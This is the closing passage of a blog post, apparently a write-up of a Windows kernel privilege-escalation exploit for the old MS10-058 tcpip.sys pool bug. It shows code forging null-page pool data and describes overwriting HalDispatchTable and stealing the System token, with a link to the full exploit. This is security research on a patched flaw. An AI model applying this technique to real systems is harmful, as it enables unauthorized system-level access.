&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1208&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1260&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x060c0a0c&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1264&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x6f6f6f6f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id="notes"&gt;Notes&lt;/h2&gt;
&lt;p&gt;It is interesting to note that this attack would not work with modern mitigations. Here are a few reasons : &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Validation of the &lt;em&gt;PoolIndex&lt;/em&gt; field&lt;/li&gt;
&lt;li&gt;Prevention of the null page allocation&lt;/li&gt;
&lt;li&gt;&lt;em&gt;NonPagedPoolNX&lt;/em&gt; has been introduced with Windows 8 and should be used instead of the &lt;em&gt;NonPagedPool&lt;/em&gt; type. &lt;/li&gt;
&lt;li&gt;SMAP would prevent access to userland data&lt;/li&gt;
&lt;li&gt;SMEP would prevent execution of userland code &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="payload-and-clean-up"&gt;Payload and clean-up&lt;/h1&gt;
&lt;p&gt;A classical target for write-what-where scenarios is the &lt;em&gt;HalDispatchTable&lt;/em&gt;. We just have to overwrite &lt;em&gt;HalDispatchTable+4&lt;/em&gt; with a pointer to our payload which is &lt;em&gt;setupPayload()&lt;/em&gt;. When we are done, we just have to put back the pointer to &lt;em&gt;hal!HaliQuerySystemInformation&lt;/em&gt;. (otherwise you can expect some crashes)&lt;/p&gt;
&lt;p&gt;Now that we are able to execute arbitrary code from kernel land we just have to get the &lt;em&gt;_EPROCESS&lt;/em&gt; of the attacking process with &lt;em&gt;PsGetCurrentProcess()&lt;/em&gt; and walk the list of processes using the &lt;em&gt;ActiveProcessLinks&lt;/em&gt; field until we encounter a process with &lt;em&gt;ImageFileName&lt;/em&gt; equal to “System”. Then we just replace the access token of the attacker process by the one of the system process. Note that the lazy author of this exploit hardcoded several offsets :).&lt;/p&gt;
&lt;p&gt;This is illustrated in &lt;em&gt;payload()&lt;/em&gt;. &lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;img alt="screenshot.png" src="/images/MS10-058/screenshot.png"&gt;&lt;/center&gt;&lt;/p&gt;
&lt;h1 id="greetings"&gt;Greetings&lt;/h1&gt;
&lt;p&gt;Special thanks to my friend &lt;a href="https://twitter.com/0vercl0k"&gt;@0vercl0k&lt;/a&gt; for his review and help!&lt;/p&gt;
&lt;h1 id="conclusion"&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;I hope you enjoyed this article. If you want to know more about the topic, check out the latest papers of Tarjei Mandt, Zhenhua Liu and Nikita Tarakanov. (or wait for other articles ;) )&lt;/p&gt;
&lt;p&gt;You can find my code on my new github &lt;a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp"&gt;[5]&lt;/a&gt;. Don’t hesitate to share comments on my article or my exploit if you see something wrong :)&lt;/p&gt;
&lt;h1 id="references"&gt;References&lt;/h1&gt;
&lt;p&gt;[1] &lt;a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html"&gt;Vulnerability details on itsecdb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2] &lt;a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058"&gt;MS bulletin&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[3] &lt;a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf"&gt;Kernel Pool Exploitation on Windows 7&lt;/a&gt; - Tarjei Mandt's paper. A must-read!&lt;/p&gt;
&lt;p&gt;[4] &lt;a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf"&gt;Reserve Objects in Windows 7&lt;/a&gt; - Great j00ru's article!&lt;/p&gt;
&lt;p&gt;[5] &lt;a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp"&gt;The code of my exploit for MS10-058&lt;/a&gt;&lt;/p&gt;</content><category term="reverse-engineering"></category><category term="exploitation"></category><category term="kernel pool"></category><category term="ms10-058"></category><category term="tcpip.sys"></category></entry></feed>